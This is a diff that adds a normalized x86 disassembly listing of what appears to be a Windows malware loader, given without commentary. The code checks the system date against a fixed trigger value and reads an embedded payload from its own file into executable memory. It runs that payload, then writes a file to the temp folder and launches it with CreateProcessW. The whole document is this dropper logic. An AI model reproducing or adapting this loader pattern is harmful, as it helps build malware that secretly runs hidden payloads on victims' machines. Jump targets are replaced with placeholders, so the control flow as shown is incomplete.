@@ -1,0 +1,115 @@
+_start
+push ebp
+mov ebp esp
+sub esp 0x834
+push ebx
+push esi
+push edi
+xor esi esi
+push esi
+push esi
+push esi
+push esi
+lea eax [ ebp - 0x34 ]
+push eax
+call [ PeekMessageA@IAT ]
+lea eax [ ebp - 0x18 ]
+push eax
+call [ GetSystemTime@IAT ]
+movzx eax [ ebp - 0x18 ]
+movzx ecx [ ebp - 0x16 ]
+imul eax eax 0x64
+add eax ecx
+movzx ecx [ ebp - 0x12 ]
+imul eax eax 0x64
+add eax ecx
+cmp eax 0x13352a3
+jl r-xdata
+xor eax eax
+push 0x800
+lea eax [ ebp - 0x834 ]
+push eax
+push esi
+call [ GetModuleFileNameW@IAT ]
+push esi
+push esi
+push 0x3
+push esi
+push 0x1
+push 0x80000000
+lea eax [ ebp - 0x834 ]
+push eax
+call [ CreateFileW@IAT ]
+mov ebx eax
+cmp ebx 0xffffffff
+jne r-xdata
+push 0x40
+push 0x1000
+mov edi 0x100000
+push edi
+push esi
+call [ VirtualAlloc@IAT ]
+push esi
+push esi
+push 0xa00
+push ebx
+mov [ ebp - 0x4 ] eax
+call [ SetFilePointer@IAT ]
+cmp eax 0xffffffff
+je r-xdata
+call [ GetLastError@IAT ]
+jmp r-xdata
+push esi
+lea eax [ ebp - 0x8 ]
+push eax
+push edi
+push [ ebp - 0x4 ]
+push ebx
+call [ ReadFile@IAT ]
+test eax eax
+je r-xdata
+pop edi
+pop esi
+pop ebx
+leave
+retn
+pushad
+mov ebx 0x0
+push ebx
+mov ebx [ ebp - 0x4 ]
+call ebx
+popad
+mov esi [ Sleep@IAT ]
+mov edi 0xbb8
+push edi
+call esi
+lea eax [ ebp - 0x834 ]
+push eax
+push 0x400
+call [ GetTempPathW@IAT ]
+push r--data
+lea eax [ ebp - 0x834 ]
+push eax
+call [ lstrcatW@IAT ]
+push rw-data
+push rw-data
+xor eax eax
+inc eax
+mov [ rw-data ] eax
+mov [ rw-data ] ax
+xor eax eax
+push eax
+push eax
+push eax
+push eax
+push eax
+push eax
+lea ecx [ ebp - 0x834 ]
+push ecx
+push eax
+mov [ rw-data ] 0x44
+call [ CreateProcessW@IAT ]
+test eax eax
+je r-xdata
+push edi
+call esi
